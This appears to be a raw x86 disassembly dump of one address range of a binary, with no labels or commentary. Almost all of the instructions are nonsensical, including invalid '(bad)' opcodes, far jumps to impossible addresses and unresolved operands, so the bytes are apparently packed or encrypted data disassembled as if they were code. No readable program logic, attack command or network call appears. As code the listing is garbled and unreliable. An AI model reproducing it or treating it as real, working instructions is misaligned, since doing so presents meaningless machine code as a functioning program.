  421fad:	or     DWORD PTR [ecx],eax
  421faf:	add    BYTE PTR [ebx],al
  421fb1:	dec    edi
  421fb2:	add    BYTE PTR [ebx-0x6804900a],bl
  421fb8:	ins    DWORD PTR es:[edi],dx
  421fb9:	or     al,BYTE PTR [eax]
  421fbb:	out    dx,ax
  421fbd:	add    BYTE PTR [esi-0x40b8e83b],ah
  421fc3:	mov    eax,ds:0xddb700a6
  421fc8:	(bad)  [esi+0x59f580db]
  421fcf:	cmp    al,0x80
  421fd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fd2:	jecxz  0x422043
  421fd4:	mov    edi,0x85ffa95f
  421fd9:	in     eax,0xff
  421fdb:	add    BYTE PTR [edi],dl
  421fdd:	sbb    DWORD PTR [eax],eax
  421fdf:	sbb    bh,BYTE PTR [ebx+0xfeee00]
  421fe5:	iret   
  421fe6:	mov    bh,0x1f
  421fe8:	pop    esp
  421fe9:	int3   
  421fea:	add    BYTE PTR [edi-0x50efff83],al
  421ff0:	jnp    0x421fcd
  421ff2:	mov    dh,0xff
  421ff4:	add    bl,ah
  421ff6:	fld    DWORD PTR [eax]
  421ff8:	jge    0x421f8c
  421ffa:	add    BYTE PTR [esi],ah
  421ffc:	fstp   TBYTE PTR [esi]
  421ffe:	retf   
  421fff:	bound  ebp,QWORD PTR [ebx+0x4d00ec5f]
  422005:	into   
  422006:	outs   dx,DWORD PTR ds:[esi]
  422007:	aaa    
  422008:	xlat   BYTE PTR ds:[ebx]
  422009:	jle    0x421fd2
  42200b:	jmp    0x9c0f8b10
  422010:	pop    edi
  422011:	mov    edi,0x2e5cf582
  422016:	add    BYTE PTR [ecx],bl
  422018:	clc    
  422019:	jle    0x42208e
  42201b:	test   DWORD PTR [edi],ebx
  42201d:	push   ss
  42201e:	pop    edi
  42201f:	jge    0x422033
  422021:	or     eax,0xbf0e6900
  422026:	imul   eax,DWORD PTR [ebp-0x72a08849],0x22007ef1
  422030:	pop    edi
  422031:	clc    
  422032:	add    BYTE PTR [edx-0x1b],ch
  422035:	jmp    0x3ac52070
  42203a:	sti    
  42203b:	fild   DWORD PTR [ebp+0x15e89c2]
  422041:	(bad)
  422045:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422046:	add    BYTE PTR [edx-0x43],al
  422049:	add    BYTE PTR [eax+0x7685bb0e],ah
  42204f:	popa   
  422050:	stos   DWORD PTR es:[edi],eax
  422051:	xor    al,0xef
  422053:	mov    dh,0x95
  422055:	cs jb  0x422017
  422058:	rol    DWORD PTR [eax],1
  42205a:	mov    ah,0xdf
  42205c:	or     dh,BYTE PTR [edi-0x7972f766]
  422062:	pop    ds
  422063:	dec    ebp
  422064:	ror    DWORD PTR [esi+0xee07900],cl
  42206a:	push   esi
  42206c:	ins    DWORD PTR es:[edi],dx
  42206d:	xor    ebx,DWORD PTR [edi]
  42206f:	cmp    esi,edx
  422071:	(bad)
  422074:	add    bl,bh
  422076:	pop    edi
  422077:	add    esi,esp
  422079:	add    BYTE PTR [ecx-0x26],dl
  42207c:	add    dl,al
  42207e:	lods   eax,DWORD PTR ds:[esi]
  42207f:	pop    ebp
  422080:	(bad)  
  422081:	xchg   edi,eax
  422082:	(bad)  
  422084:	add    dl,cl
  422086:	inc    ebp
  422087:	add    BYTE PTR [edi],ah
  422089:	(bad)  
  42208a:	add    BYTE PTR [ebx],ah
  42208c:	sub    eax,0xbb80953e
  422091:	ins    DWORD PTR es:[edi],dx
  422092:	outs   dx,DWORD PTR ds:[esi]
  422093:	fucomi st,st(2)
  422095:	aaa    
  422096:	pop    edi
  422097:	inc    ebx
  422098:	outs   dx,BYTE PTR ds:[esi]
  422099:	sbb    eax,0x4bc20600
  42209e:	pop    edi
  42209f:	jns    0x4220b7
  4220a1:	sub    al,0x7d
  4220a3:	fisttp DWORD PTR [ebp*2-0x5b2073fc]
  4220aa:	jp     0x42204d
  4220ac:	sbb    DWORD PTR [esi],esp
  4220ae:	add    BYTE PTR [ebx-0x47],dh
  4220b1:	jge    0x4220ea
  4220b3:	mov    esi,0x6e915f
  4220b8:	fstp   DWORD PTR [edi]
  4220ba:	cmp    al,BYTE PTR [edi-0x4440ada4]
  4220c0:	dec    esi
  4220c1:	push   DWORD PTR [esi+0x61]
  4220c4:	jecxz  0x42207e
  4220c6:	adc    esi,DWORD PTR [ecx+0x5faf6210]
  4220cc:	mov    eax,0xa5aa00
  4220d1:	nop
  4220d2:	jbe    0x422096
  4220d4:	push   esi
  4220d5:	dec    bl
  4220d7:	add    bl,al
  4220d9:	retf   
  4220da:	sahf   
  4220db:	add    BYTE PTR [ecx-0x2875ff7b],cl
  4220e1:	jge    0x422065
  4220e3:	pop    es
  4220e4:	jg     0x4220df
  4220e6:	outs   dx,DWORD PTR ds:[esi]
  4220e7:	fucomi st,st(1)
  4220e9:	push   cs
  4220ea:	jmp    0x42214b
  4220ec:	or     esi,esi
  4220ee:	add    BYTE PTR [ecx-0x21],ah
  4220f1:	add    BYTE PTR [edx-0x25ffe301],dh
  4220f7:	push   ebp
  4220f8:	add    ah,al
  4220fa:	inc    DWORD PTR [edx-0x5]
  4220fd:	in     eax,0xc6
  4220ff:	add    BYTE PTR [ebx],dl
  422101:	cmp    eax,0x313900ce
  422106:	push   cs
  422107:	fbstp  TBYTE PTR [ebx+0x23]
  42210a:	add    BYTE PTR [edx],dh
  42210c:	sub    eax,0xc376200
  422111:	fistp  WORD PTR [esi+0x116e58ee]
  422117:	ja     0x422119
  422119:	add    bl,BYTE PTR [edi]
  42211b:	arpl   WORD PTR [edx],cx
  42211d:	add    eax,0xdb6ff96d
  422122:	add    BYTE PTR [eax-0x74],dh
  422125:	arpl   WORD PTR [edi+0x6b],bx
  422128:	jle    0x42212a
  42212a:	jmp    0x776c2191
  42212f:	fwait
  422130:	es in  eax,dx
  422132:	mov    dh,0x6d
  422134:	sbb    esp,DWORD PTR [edi]
  422136:	dec    edi
  422137:	mov    dh,0x8b
  422139:	pop    edi
  42213a:	lahf   
  42213b:	mov    al,0xc1
  42213d:	les    ecx,FWORD PTR [ebp+edx*1-0x604b9392]
  422144:	pop    edi
  422145:	add    esi,edi
  422147:	push   edi
  422148:	sbb    al,cl
  42214a:	fistp  QWORD PTR [ebx+eiz*1]
  42214d:	fnsave [esi-0x27b8c2ec]
  422153:	mov    edi,0xc8054418
  422158:	xor    edx,edx
  42215a:	mov    WORD PTR [ebx-0x73207ece],ds
  422160:	cmp    al,0x23
  422162:	int    0xa8
  422164:	int3   
  422165:	hlt    
  422166:	icebp  
  422167:	int    0xcd
  422169:	enter  0xd233,0xe6
  42216d:	repnz mov ecx,DWORD PTR [esi]
  422170:	mov    al,0xd2
  422172:	mov    WORD PTR [ebx+eiz*1],?
  422175:	or     DWORD PTR [ebp-0x32dca5da],ebp
  42217b:	enter  0x3933,0x77
  42217f:	ins    DWORD PTR es:[edi],dx
  422180:	sbb    BYTE PTR fs:[edx+0xcb23fc],bh
  422187:	inc    ecx
  422188:	adc    al,0x54
  42218a:	xor    eax,DWORD PTR [eax]
  42218c:	sub    esp,ebx
  42218e:	add    BYTE PTR [ebx+ebp*8-0x3d371287],al
  422195:	push   esi
  422196:	inc    ecx
  422197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422198:	cmp    DWORD PTR [edi+0x3d],0x34d77314
  42219f:	adc    al,0x6e
  4221a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221a2:	pushf  
  4221a3:	jns    0x422204
  4221a5:	stos   DWORD PTR es:[edi],eax
  4221a6:	mov    ecx,0x48dddf91
  4221ab:	xor    esi,edx
  4221ad:	mov    WORD PTR [edi-0x73f826ce],ss
  4221b3:	xor    al,0x23
  4221b5:	iret   
  4221b6:	fsub   QWORD PTR [ecx+ebx*8]
  4221b9:	push   ecx
  4221ba:	out    dx,eax
  4221bb:	iret   
  4221bc:	dec    eax
  4221bd:	xor    esi,edx
  4221bf:	jle    0x4221c9
  4221c1:	imul   ebp,DWORD PTR ds:0x348cf290,0x23
  4221c8:	sub    BYTE PTR [ebp-0x30dc55ab],al
  4221ce:	dec    eax
  4221cf:	xor    edx,DWORD PTR [edi+ebx*8+0x69]
  4221d3:	int3   
  4221d4:	call   0x84f9:0x348cf233
  4221db:	push   ss
  4221dc:	mov    al,ds:0x48cf2334
  4221e1:	add    ebx,ebp
  4221e3:	cmp    ch,ah
  4221e5:	sub    eax,0x8cf23348
  4221ea:	nop
  4221eb:	cmp    dx,WORD PTR [ebx-0x74]
  4221ef:	xor    al,0x23
  4221f1:	iret   
  4221f2:	or     eax,0xdbd2048
  4221f7:	iret   
  4221f8:	dec    eax
  4221f9:	xor    esi,edx
  4221fb:	xchg   edx,eax
  4221fc:	inc    ebx
  4221fd:	xchg   DWORD PTR [esp+eiz*8-0xe],edi
  422201:	mov    WORD PTR [ebx+eiz*1],?
  422204:	jno    0x4221f7
  422206:	pushf  
  422207:	ficom  WORD PTR [ebp-0x46c69b81]
  42220d:	push   esi
  42220e:	sub    ecx,DWORD PTR [esi+0xb5ba00]
  422214:	xor    BYTE PTR [esi-0x26],ah
  422217:	mov    dh,0xdb
  422219:	mov    dh,0x5f
  42221b:	fucomp st(4)
  42221d:	cdq    
  42221e:	xor    eax,0xcc5fc77a
  422223:	push   eax
  422224:	lea    esi,[esi-0x55]
  422227:	std    
  422228:	pop    edx
  422229:	sbb    eax,0x86e91f8e
  42222e:	inc    ecx
  42222f:	or     ah,BYTE PTR [edx+0x4fad5fef]
  422235:	pop    ebx
  422236:	(bad)  [esi]
  422238:	in     al,dx
  422239:	gs mov edi,0xde05bfb6
  42223f:	mov    dh,0xb6
  422241:	adc    eax,0xca135bb6
  422246:	pop    ss
  422247:	pop    edi
  422248:	cmp    eax,0xeb60216
  42224d:	outs   dx,DWORD PTR ds:[esi]
  42224e:	adc    eax,0x5f2bdb6e
  422253:	pop    ecx
  422254:	and    BYTE PTR [ecx],ah
  422256:	xor    DWORD PTR [edi+edi*2],0xffffff8b
  42225a:	imul   eax,DWORD PTR [eax],0xf95b4bb5
  422260:	sbb    dl,BYTE PTR ds:0x5f069800
  422266:	adc    al,0x74
  422268:	stc    
  422269:	test   DWORD PTR [esi],ecx
  42226b:	ins    DWORD PTR es:[edi],dx
  42226c:	test   eax,0xcd1f705d
  422271:	jb     0x422260
  422273:	jmp    0xbba19d89
  422278:	mov    ecx,0x6e9bb616
  42227d:	rcl    DWORD PTR [esi],1
  42227f:	inc    edx
  422280:	jg     0x4222e7
  422282:	dec    edx
  422283:	lds    edx,FWORD PTR [ebx+0x5b]
  422286:	stc    
  422287:	outs   dx,DWORD PTR ds:[esi]
  422288:	pop    ebx
  422289:	mov    WORD PTR [ebx+0xbeaa5f],fs
  42228f:	test   eax,0xb76a0059
  422294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422295:	mov    ds:0x5b6db5dc,al
  42229a:	popf   
  42229b:	jbe    0x422253
  42229d:	retf   
  42229e:	pop    edi
  42229f:	std    
  4222a0:	fild   WORD PTR [ebx]
  4222a2:	add    BYTE PTR [edx-0x2c186468],dl
  4222a8:	clc    
  4222a9:	sbb    BYTE PTR [esi-0x45ffd2de],ah
  4222af:	pop    ebx
  4222b0:	clc    
  4222b1:	fisubr DWORD PTR [esi+0x30]
  4222b4:	ror    BYTE PTR [ebp-0x80],cl
  4222b7:	into   
  4222b8:	jg     0x4222e3
  4222ba:	push   ss
  4222bb:	xor    edi,edx
  4222bd:	fcmovnb st,st(2)
  4222bf:	mov    bh,0x76
  4222c1:	loop   0x4222f2
  4222c3:	pop    edi
  4222c4:	sahf   
  4222c5:	sub    ah,BYTE PTR ds:0x43349400
  4222cb:	pop    edi
  4222cc:	imul   edx,esi,0xffffffba
  4222cf:	push   eax
  4222d0:	(bad)  
  4222d1:	push   ds
  4222d2:	add    BYTE PTR [ecx],cl
  4222d4:	add    DWORD PTR [eax],0x25e570a
  4222da:	std    
  4222db:	inc    esi
  4222dc:	push   cs
  4222dd:	mov    dh,0x6d
  4222df:	ins    DWORD PTR es:[edi],dx
  4222e0:	fld    TBYTE PTR [ebx+0x5f]
  4222e3:	scas   eax,DWORD PTR es:[edi]
  4222e4:	or     esp,ecx
  4222e6:	aaa    
  4222e7:	xor    dl,ah
  4222e9:	retf   
  4222ea:	jge    0x4222e6
  4222ec:	aad    0xa2
  4222ee:	jmp    0x4eb7:0x7f36d55a
  4222f5:	imul   ebx,DWORD PTR [ebx+0x68],0xffffffde
  4222f9:	fbstp  TBYTE PTR ds:0x6ab45a00
  4222ff:	lods   eax,DWORD PTR ds:[esi]
  422300:	mov    al,0x6e
  422302:	jg     0x42235f
  422304:	stc    
  422305:	test   ebp,ebp
  422307:	lds    ebp,FWORD PTR [esi-0x6f]
  42230a:	xchg   esp,eax
  42230b:	or     bh,0x0
  42230e:	sbb    esi,edi
  422310:	lds    edi,FWORD PTR [ebx+ebx*8-0x4a]
  422314:	mov    al,0x6d
  422316:	mov    ebx,fs
  422318:	pop    edi
  422319:	jmp    0x4311:0xaae069e8
  422320:	(bad)  
  422322:	fidiv  DWORD PTR [esi+0x6b5d6e70]
  422328:	mov    esi,0x41120adf
  42232d:	inc    esp
  42232e:	jae    0x4222b1
  422330:	ret    0xd276
  422333:	pop    ds
  422334:	pop    edi
  422335:	and    eax,ebp
  422337:	aas    
  422338:	int3   
  422339:	out    0x33,al
  42233b:	jb     0x422386
  42233d:	xlat   BYTE PTR ds:[ebx]
  42233e:	inc    esi
  42233f:	jg     0x42233a
  422341:	xchg   esi,eax
  422342:	jns    0x422361
  422344:	and    ecx,edi
  422346:	dec    eax
  422347:	sbb    DWORD PTR [ecx-0x52607748],0xffffffd2
  42234e:	mov    WORD PTR [ebx+eiz*1],?
  422351:	xchg   ecx,eax
  422352:	inc    edx
  422353:	shl    BYTE PTR [edi+0x23],1
  422356:	int    0xc8
  422358:	xor    eax,esp
  42235a:	je     0x422357
  42235c:	add    ebx,esp
  42235e:	xor    edx,edx
  422360:	mov    WORD PTR [esi+ebp*1],?
  422363:	sub    DWORD PTR [ebx],edi
  422365:	and    BYTE PTR [esi-0x3f373493],dh
  42236b:	inc    esp
  42236c:	jmp    0x39b68494
  422371:	shl    DWORD PTR [esi-0x68249250],1
  422377:	push   eax
  422378:	or     DWORD PTR [edi+0x6a592cd1],edi
  42237e:	idiv   BYTE PTR [edi-0x3d3d3d13]
  422384:	test   eax,0xf93467d6
  422389:	push   edx
  42238a:	push   ss
  42238b:	push   ds
  42238c:	ja     0x42235d
  42238e:	dec    eax
  42238f:	push   edi
  422390:	or     ecx,0x17
  422393:	jg     0x42231e
  422395:	mov    dh,0x66
  422397:	repnz mov WORD PTR [ebx+eiz*1],?
  42239b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42239c:	jae    0x422368
  42239e:	dec    eax
  42239f:	mov    WORD PTR [ecx+0x49],?
  4223a2:	xor    edx,eax
  4223a4:	pop    ebp
  4223a5:	xor    bl,BYTE PTR [edi+0x33c8cd1d]
  4223ab:	rol    BYTE PTR [edi],cl
  4223ad:	add    al,0x24
  4223af:	adc    eax,0x3c8cd2d1
  4223b4:	and    ebp,DWORD PTR [esi+edi*8]
  4223b7:	inc    eax
  4223b8:	jmp    0x4223dd
  4223ba:	int    0xc8
  4223bc:	xor    esi,DWORD PTR [edi-0x70]
  4223bf:	addr16 test eax,esi
  4223c2:	xor    edx,edx
  4223c4:	mov    WORD PTR [edx+ecx*4],?
  4223c7:	mov    edi,DWORD PTR [edi-0x46]
  4223ca:	leave  
  4223cb:	xor    esi,DWORD PTR [edx]
  4223cd:	leave  
  4223ce:	ins    BYTE PTR es:[edi],dx
  4223cf:	pop    ecx
  4223d0:	aam    0x36
  4223d2:	int    0xc8
  4223d4:	xor    esi,DWORD PTR [edx]
  4223d6:	and    ebp,DWORD PTR [eax]
  4223d8:	sbb    BYTE PTR [esi],dl
  4223da:	or     eax,0x233c8cd2
  4223df:	aas    
  4223e0:	loop   0x422441
  4223e2:	xlat   BYTE PTR ds:[ebx]
  4223e3:	and    ecx,ebp
  4223e5:	enter  0x4d33,0xd4
  4223e9:	addr16 mov eax,ds:0x3373
  4223ed:	ror    BYTE PTR [esp+edi*1-0x42645e72],cl
  4223f4:	cmp    al,0x23
  4223f6:	int    0xc8
  4223f8:	pusha  
  4223f9:	test   eax,0xc85adf75
  4223fe:	xor    edx,edx
  422400:	mov    esi,gs
  422402:	das    
  422403:	icebp  
  422404:	cmp    al,0x93
  422406:	cmp    al,0x23
  422408:	int    0x74
  42240a:	in     eax,0x27
  42240c:	or     bl,BYTE PTR [edi]
  42240e:	ror    BYTE PTR [esp+edi*1+0x702c4c23],cl
  422415:	cmp    DWORD PTR ds:0x7833c8cd,esp
  42241b:	push   esi
  42241c:	mov    fs,WORD PTR [ebx+0x3c]
  42241f:	and    ecx,ebp
  422421:	enter  0xb578,0x8d
  422425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422426:	mov    ds:0x8cd25c93,al
  42242b:	out    dx,eax
  42242c:	mov    bh,0x34
  42242e:	and    edx,edx
  422430:	mov    WORD PTR [ebx+eiz*1],?
  422433:	add    al,0xe
  422435:	cmp    ebx,edi
  422437:	and    ecx,ebp
  422439:	enter  0x3033,0xe0
  42243d:	inc    eax
  42243e:	aad    0x20
  422440:	xor    edx,edx
  422442:	mov    WORD PTR [eax+ebx*2],?
  422445:	pop    edi
  422446:	dec    ebp
  422447:	popf   
  422448:	xor    edx,edx
  42244a:	ror    al,0x72
  42244d:	nop
  42244e:	aas    
  42244f:	test   BYTE PTR [si],bh
  422452:	and    ecx,ebp
  422454:	enter  0xd484,0xb1
  422458:	fisubr DWORD PTR [esi-0x732dcc37]
  42245e:	icebp  
  42245f:	fndisi(8087 only) 
  422461:	lock mov WORD PTR [ebx+eiz*1],?
  422465:	xor    ebp,esp
  422467:	pop    ds
  422468:	sbb    ebx,DWORD PTR [edx]
  42246a:	sub    ecx,ebp
  42246c:	enter  0xd233,0xf
  422470:	pop    esi
  422471:	cmp    al,0x68
  422473:	dec    ecx
  422474:	ror    BYTE PTR [esp+edi*1-0x73a992dd],cl
  42247b:	arpl   WORD PTR [ebx],sp
  42247d:	int    0xc8
  42247f:	xor    edx,DWORD PTR [eax+ecx*4+0x33eabfcc]
  422486:	ror    BYTE PTR [esp+edi*1-0x1c663e74],cl
  42248d:	repnz mov WORD PTR [ecx],?
  422490:	leave  
  422491:	test   bl,0x9f
  422494:	add    eax,0x48cf23d8
  422499:	xor    esi,DWORD PTR [ecx]
  42249b:	sub    eax,0x33440214
  4224a0:	repnz mov WORD PTR [edi+edx*1],?
  4224a4:	push   0x54
  4224a6:	popa   
  4224a7:	xor    al,0x23
  4224a9:	iret   
  4224aa:	dec    eax
  4224ab:	inc    ecx
  4224ac:	xchg   ecx,eax
  4224ad:	outs   dx,BYTE PTR ds:[esi]
  4224ae:	mov    eax,0xb6b6d89b
  4224b3:	mov    eax,cs
  4224b5:	jne    0x4224cb
  4224b7:	bound  ecx,QWORD PTR [edx+0x5db63fd7]
  4224bd:	ficomp WORD PTR [edx+0x5cec957f]
  4224c3:	add    BYTE PTR [edx],ch
  4224c5:	fldenv [edi+edi*4+0x35]
  4224c9:	cwde   
  4224ca:	enter  0xb707,0xa5
  4224ce:	jp     0x42251a
  4224d0:	inc    edi
  4224d1:	jnp    0x42247b
  4224d3:	pop    edi
  4224d4:	jmp    0xcd656165
  4224d9:	xlat   BYTE PTR ds:[ebx]
  4224da:	sahf   
  4224db:	repnz mov bl,0x9
  4224de:	int    0xc8
  4224e0:	xor    edx,edx
  4224e2:	mov    eax,0x52304539
  4224e7:	rol    ah,cl
  4224e9:	enter  0x7f25,0x4c
  4224ed:	jg     0x4224fb
  4224ef:	mov    WORD PTR [ecx+ecx*8],?
  4224f2:	xor    edi,DWORD PTR [edx+0x11]
  4224f5:	es mov edi,0x3348cf83
  4224fb:	repnz retf 
  4224fd:	test   eax,0xf2edcbd0
  422502:	mov    WORD PTR [ebx+eiz*1],?
  422505:	xlat   BYTE PTR ds:[ebx]
  422506:	cli    
  422507:	rcl    DWORD PTR [edi+0x3348cf23],1
  42250d:	jl     0x4224aa
  42250f:	cmp    eax,DWORD PTR [eax-0x730dcce4]
  422515:	xor    al,0x75
  422517:	pop    es
  422518:	pop    edx
  422519:	dec    ecx
  42251a:	xor    al,0x23
  42251c:	iret   
  42251d:	dec    eax
  42251e:	dec    edi
  42251f:	ins    BYTE PTR es:[edi],dx
  422520:	cmp    al,0x42
  422522:	sub    DWORD PTR [eax+0x33],ecx
  422525:	repnz mov WORD PTR [edi-0x730c4ffa],ds
  42252c:	xor    al,0x23
  42252e:	iret   
  42252f:	lods   al,BYTE PTR ds:[esi]
  422530:	call   0xd0150306
  422535:	dec    eax
  422536:	xor    esi,edx
  422538:	mov    dl,0xdc
  42253a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42253b:	sbb    DWORD PTR [edx+esi*8+0x1023348c],eax
  422542:	xchg   ecx,eax
  422543:	cmp    BYTE PTR [esi-0x62],bh
  422546:	iret   
  422547:	dec    eax
  422548:	xor    edi,DWORD PTR [ebp+0x4b]
  42254b:	sub    BYTE PTR ds:0xf3cd4707,dh
  422551:	imul   ebp,DWORD PTR [esi+0x42],0x6f481b00
  422558:	das    
  422559:	stos   BYTE PTR es:[edi],al
  42255a:	jl     0x422515
  42255c:	jns    0x42259c
  42255e:	int    0x0
  422560:	inc    ebx
  422561:	mov    bh,0x81
  422563:	push   edi
  422564:	test   al,0x96
  422566:	add    BYTE PTR [ebx+0x48],ch
  422569:	push   ebx
  42256a:	iret   
  42256b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42256c:	aam    0xbb
  42256e:	jg     0x422569
  422570:	aas    
  422571:	rol    BYTE PTR [ecx+0x3b],0xe4
  422575:	sar    edx,cl
  422577:	mov    edi,0x20f7a7dd
  42257c:	call   0x1423:0x5fd3e79b
  422583:	iret   
  422584:	and    eax,DWORD PTR [ecx]
  422586:	add    bl,ah
  422588:	dec    eax
  422589:	dec    edi
  42258a:	jae    0x42257f
  42258c:	jl     0x4225cc
  42258e:	neg    DWORD PTR [ebp+0x2b]
  422591:	add    BYTE PTR [ebx],cl
  422593:	push   esi
  422594:	inc    eax
  422595:	repz imul ebp,DWORD PTR [esi-0x62],0x75951f
  42259d:	xor    eax,DWORD PTR [edx+ebp*2-0x32c186b9]
  4225a4:	int    0xb1
  4225a6:	lahf   
  4225a7:	add    BYTE PTR [ebx-0x7f],bl
  4225aa:	lods   al,BYTE PTR ds:[esi]
  4225ab:	outs   dx,DWORD PTR ds:[esi]
  4225ac:	lods   al,BYTE PTR ds:[esi]
  4225ad:	aaa    
  4225ae:	iret   
  4225af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225b0:	mov    ecx,0xdd810006
  4225b5:	jnp    0x42254c
  4225b7:	cld    
  4225b8:	jo     0x4225ba
  4225ba:	test   eax,0x34f9e6e6
  4225bf:	sbb    DWORD PTR [ebp-0x43],ebx
  4225c2:	sub    BYTE PTR [edx-0x49652f00],ch
  4225c8:	and    DWORD PTR [edi+0x62e5b718],ebx
  4225ce:	stc    
  4225cf:	mov    edi,0xf3721e4f
  4225d4:	jl     0x4225bf
  4225d6:	or     eax,0x2100fe6f
  4225db:	ret    
  4225dc:	xor    eax,0x79b9a7cf
  4225e1:	xchg   edi,eax
  4225e2:	fadd   DWORD PTR [eax]
  4225e4:	dec    ecx
  4225e5:	mov    ds:0xe6bc5d35,eax
  4225ea:	stc    
  4225eb:	xor    al,0x37
  4225ed:	xchg   BYTE PTR [eax],al
  4225ef:	jae    0x4225b5
  4225f1:	fwait
  4225f2:	xchg   edi,esp
  4225f4:	fdivr  QWORD PTR [edi+ebx*4]
  4225f7:	out    0xd0,al
  4225f9:	add    BYTE PTR [ebx+0x1eaffdf4],bl
  4225ff:	jmp    0xd3e7:0x9b9ac300
  422606:	cmp    edx,DWORD PTR [edi]
  422608:	xlat   BYTE PTR ds:[ebx]
  422609:	and    eax,0x44eb0004
  42260e:	dec    edi
  42260f:	jae    0x422604
  422611:	jl     0x42263c
  422613:	call   FWORD PTR [ebp+0x5e]
  422616:	add    BYTE PTR [ebx],dl
  422618:	or     BYTE PTR [eax-0xd],dh
  42261b:	imul   ebp,DWORD PTR [esi-0x62],0x459827
  422622:	cmp    edx,DWORD PTR [ebx+0x233c4faa]
  422628:	int    0xc8
  42262a:	mov    eax,0xc777ca63
  42262f:	enter  0xd233,0x8c
  422633:	mov    edi,ebp
  422635:	lahf   
  422636:	or     al,0x3e
  422638:	in     al,0xd3
  42263a:	shl    DWORD PTR [ebx-0x3827fea1],0x2d
  422641:	add    bl,bl
  422643:	int    0xcd
  422645:	repz imul eax,DWORD PTR [eax-0x68],0x8d6fed
  42264d:	add    DWORD PTR [ebp-0x59],ebp
  422650:	mov    ecx,0x15f23e79
  422655:	jbe    0x422638
  422657:	add    BYTE PTR [ecx],ch
  422659:	mov    bh,0xf9
  42265b:	xor    al,0x37
  42265d:	iret   
  42265e:	lds    edi,FWORD PTR ds:0x510032ae
  422664:	cwde   
  422665:	das    
  422666:	and    DWORD PTR gs:[edi+0x1cdbe6e6],ebx
  42266d:	add    BYTE PTR [ecx-0x2d],bh
  422670:	jle    0x4225ff
  422672:	cmp    al,0x9f
  422674:	mov    es,edx
  422676:	imul   ebp,DWORD PTR [eax],0xffffff9f
  422679:	or     al,0x5c
  42267b:	mov    ch,0xb
  42267d:	fwait
  42267e:	out    0xd3,eax
  422680:	fadd   QWORD PTR [edi+0x0]
  422683:	leave  
  422684:	and    esp,DWORD PTR [ecx+0x133cdd]
  42268a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42268b:	sbb    DWORD PTR [ecx-0x66],edi
  42268e:	repz inc esp
  422690:	or     BYTE PTR [edi+0x7d],ah
  422693:	inc    esi
  422694:	call   0x479e:0x52746791
  42269b:	mov    ah,0x67
  42269d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42269e:	sbb    DWORD PTR [ecx-0x5c],edi
  4226a1:	mov    eax,ds:0x4679deb1
  4226a6:	call   0xde88:0xebdd9e91
  4226ad:	xchg   ecx,eax
  4226ae:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4226b0:	sbb    DWORD PTR ds:0x190004eb,edx
  4226b6:	jns    0x4226fe
  4226b8:	call   0xf254:0x2a59153a
  4226bf:	dec    ebx
  4226c0:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4226c2:	aas    
  4226c3:	jns    0x42270c
  4226c5:	lods   al,BYTE PTR ds:[esi]
  4226c6:	rol    DWORD PTR [eax],cl
  4226c8:	push   edx
  4226c9:	or     eax,0xda3747e7
  4226ce:	sbb    BYTE PTR [edi+0x0],0x4e
  4226d2:	sbb    bh,0x69
  4226d5:	lods   eax,DWORD PTR ds:[esi]
  4226d6:	repz jl 0x422673
  4226d9:	fwait
  4226da:	ds jle 0x4226dd
  4226dd:	sar    DWORD PTR ds:0x6e23d583,0x9e
  4226e4:	dec    edi
  4226e5:	jae    0x42267f
  4226e7:	add    cl,ch
  4226e9:	jg     0x4226a0
  4226eb:	std    
  4226ec:	ins    BYTE PTR es:[edi],dx
  4226ed:	ret    0x1100
  4226f0:	sub    bl,BYTE PTR [edx+esi*8]
  4226f3:	imul   ebp,DWORD PTR [ebp-0x21],0x348eec25
  4226fa:	pop    ds
  4226fb:	bnd jmp 0x4d43d280
  422701:	push   ss
  422702:	add    BYTE PTR [ecx-0x3f],ah
  422705:	sahf   
  422706:	xchg   ecx,eax
  422707:	out    0xf9,al
  422709:	sub    esi,DWORD PTR [ebp-0x1f]
  42270c:	shr    al,0xad
  42270f:	jl     0x422729
  422711:	imul   eax,DWORD PTR [esi+0x3d],0x62df689a
  422718:	lds    esp,FWORD PTR [ebx]
  42271a:	dec    edi
  42271b:	jae    0x422710
  42271d:	push   es
  42271e:	xchg   edi,eax
  42271f:	add    cl,bl
  422721:	and    eax,0xf2334bb4
  422726:	mov    WORD PTR [ecx+eiz*4],?
  422729:	dec    ebx
  42272a:	fisub  WORD PTR [ecx+0x34]
  42272d:	and    ecx,edi
  42272f:	dec    eax
  422730:	retf   
  422731:	test   al,ah
  422733:	mov    dl,BYTE PTR ds:0x8cf23348
  422739:	test   eax,0xcf3fd80a
  42273e:	enter  0xcf24,0xd5
  422742:	dec    esp
  422743:	pop    ecx
  422744:	cmp    eax,0x348cf266
  422749:	and    ebx,DWORD PTR [ebx+esi*2]
  42274c:	adc    DWORD PTR [eax+0x4f34f90e],ebx
  422752:	xchg   DWORD PTR [eax],eax
  422754:	icebp  
  422755:	inc    edi
  422756:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422757:	add    eax,0x74f9e6d1
  42275c:	xchg   ebp,eax
  42275d:	xchg   BYTE PTR [edi+0x65],bh
  422760:	(bad)  
  422761:	sub    eax,0x9f3cdca7
  422766:	out    0xd2,al
  422768:	add    BYTE PTR [ecx-0x76],al
  42276b:	sub    DWORD PTR [ebp-0x79],edx
  42276e:	add    BYTE PTR ds:[ecx+0x69],ch
  422772:	ds in  al,0xd3
  422775:	fsubr  QWORD PTR [edi]
  422777:	jge    0x4227d5
  422779:	add    BYTE PTR [ecx-0x3232c10f],dl
  42277f:	repz jg 0x422727
  422782:	adc    DWORD PTR [eax+eax*1-0x47],ecx
  422786:	pop    es
  422787:	cdq    
  422788:	int    0xcf
  42278a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42278b:	mov    ecx,0xd94c79
  422790:	loope  0x422811
  422792:	out    0xf5,al
  422794:	inc    ecx
